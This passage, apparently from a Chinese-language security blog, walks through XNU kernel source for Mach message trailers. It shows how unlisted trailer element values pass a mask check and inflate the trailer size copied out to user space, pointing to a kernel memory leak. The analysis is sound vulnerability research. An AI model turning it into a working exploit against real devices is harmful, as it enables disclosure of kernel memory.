	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_add_trailer()&lt;/code&gt;此时已经拿到整个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kmsg&lt;/code&gt;，但是最后的trailer还是根据发送者的定义，此处需要结合接收者的请求去做动态修改&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msgh_trailer_size&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_trailer_size_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;ipc_kmsg_add_trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_kmsg_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_space_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;space&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__unused&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_option_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_t&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_port_seqno_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seqno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;boolean_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;minimal_trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_vm_offset_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 默认定义的是最大的trailer类型&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_max_trailer_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#ifdef __arm64__
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 创建栈变量tmp_trailer&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_max_trailer_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp_trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* This accommodates U64, and we'll munge */&lt;/span&gt;
	
	&lt;span class=&quot;c1&quot;&gt;// kmsg的trailer数据起始地址&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;real_trailer_out&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_max_trailer_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	    &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_offset_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
	    &lt;span class=&quot;n&quot;&gt;mach_round_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;// 拷贝kmsg的trailer到tmp_trailer&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// 此时先读取最大长度MAX_TRAILER_SIZE，跟发送消息逻辑对应&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;bcopy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;real_trailer_out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX_TRAILER_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#else &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* __arm64__ */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_max_trailer_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	    &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_offset_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
	    &lt;span class=&quot;n&quot;&gt;mach_round_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* __arm64__ */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;    
    &lt;span class=&quot;c1&quot;&gt;// 函数ipc_kmsg_get()定义：trailer-&amp;gt;msgh_trailer_size = MACH_MSG_TRAILER_MINIMUM_SIZE;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 要是没有MACH_RCV_TRAILER_MASK就直接返回最小的trailer长度&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 没有这个标志位的意思就是trailer类型为mach_msg_trailer_t&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// mach_msg_trailer_t结构体长度就是发送者默认设置的MACH_MSG_TRAILER_MINIMUM_SIZE&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// #define MACH_RCV_TRAILER_MASK        ((0xf &amp;lt;&amp;lt; 24))&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_RCV_TRAILER_MASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_trailer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_seqno&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seqno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_context&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// 使用宏REQUESTED_TRAILER_SIZE计算msgh_trailer_size&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 这里我们可以理解一下逻辑：&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 在发送端，先设置最大的trailer空间，长度字段msgh_trailer_size设置为最小&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 消息到达接收端的时候，根据接收端的trailer设置，动态调整长度字段msgh_trailer_size&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_trailer_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;REQUESTED_TRAILER_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thread_is_64bit_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minimal_trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 如果参数小于7，则不初始化&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// #define MACH_RCV_TRAILER_AV     7&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GET_RCV_ELEMENTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_RCV_TRAILER_AV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_ad&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/*
	 * The ipc_kmsg_t holds a reference to the label of a label
	 * handle, not the port. We must get a reference to the port
	 * and a send right to copyout to the receiver.
	 */&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_RCV_TRAILER_ELEMENTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MACH_RCV_TRAILER_LABELS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_labels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;done:&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#ifdef __arm64__
&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ipc_kmsg_munge_trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;real_trailer_out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_is_64bit_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* __arm64__ */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_trailer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;宏&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;REQUESTED_TRAILER_SIZE_NATIVE&lt;/code&gt;定义如下，逐个判断，匹配到哪个参数就是对应结构体长度&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define REQUESTED_TRAILER_SIZE_NATIVE(y)                        \
	((mach_msg_trailer_size_t)                              \
	 ((GET_RCV_ELEMENTS(y) == MACH_RCV_TRAILER_NULL) ?      \
	  sizeof(mach_msg_trailer_t) :                          \
	  ((GET_RCV_ELEMENTS(y) == MACH_RCV_TRAILER_SEQNO) ?    \
	   sizeof(mach_msg_seqno_trailer_t) :                   \
	  ((GET_RCV_ELEMENTS(y) == MACH_RCV_TRAILER_SENDER) ?   \
	   sizeof(mach_msg_security_trailer_t) :                \
	   ((GET_RCV_ELEMENTS(y) == MACH_RCV_TRAILER_AUDIT) ?   \
	    sizeof(mach_msg_audit_trailer_t) :                  \
	    ((GET_RCV_ELEMENTS(y) == MACH_RCV_TRAILER_CTX) ?    \
	     sizeof(mach_msg_context_trailer_t) :               \
	     ((GET_RCV_ELEMENTS(y) == MACH_RCV_TRAILER_AV) ?    \
	      sizeof(mach_msg_mac_trailer_t) :                  \
	     sizeof(mach_msg_max_trailer_t))))))))
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;确实乍一看这里的计算方式没有问题，但我们来看一段宏定义，如果我们传入的是5或者6这种定义里没有的数据呢？&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define MACH_RCV_TRAILER_NULL   0   // mach_msg_trailer_t
#define MACH_RCV_TRAILER_SEQNO  1   // mach_msg_seqno_trailer_t
#define MACH_RCV_TRAILER_SENDER 2   // mach_msg_security_trailer_t
#define MACH_RCV_TRAILER_AUDIT  3   // mach_msg_audit_trailer_t
#define MACH_RCV_TRAILER_CTX    4   // mach_msg_context_trailer_t
#define MACH_RCV_TRAILER_AV     7
#define MACH_RCV_TRAILER_LABELS 8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;当我们传入的是5，计算出的位数据为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0b111000000000000000000000010&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MACH_RCV_TRAILER_MASK&lt;/code&gt;的位数据为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0b1111000000000000000000000000&lt;/code&gt;，也就是说，5可以通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MACH_RCV_TRAILER_MASK&lt;/code&gt;标志位的判断&lt;/p&gt;

&lt;p&gt;回到函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_receive_results()&lt;/code&gt;，上面计算到的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;trailer_size&lt;/code&gt;会在计算完成后传入函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_put()&lt;/code&gt;，这个函数主要用于将消息从内核态拷贝到用户态&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcv_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trailer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;注意看拷贝操作的长度变量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;size&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;ipc_kmsg_put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_kmsg_t&lt;/span&gt;              &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_option_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;rcv_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;rcv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;trailer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sizep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 整个长度就是消息长度加上trailer的长度&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trailer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#if defined(__LP64__)
&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* don't if receiver expects fully-cooked in-kernel msg; */&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;mach_msg_legacy_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;legacy_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
		    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_legacy_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_offset_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LEGACY_HEADER_SIZE_DELTA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;mach_msg_bits_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;bits&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;msg_size&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;remote_port&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CAST_MACH_PORT_TO_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_remote_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
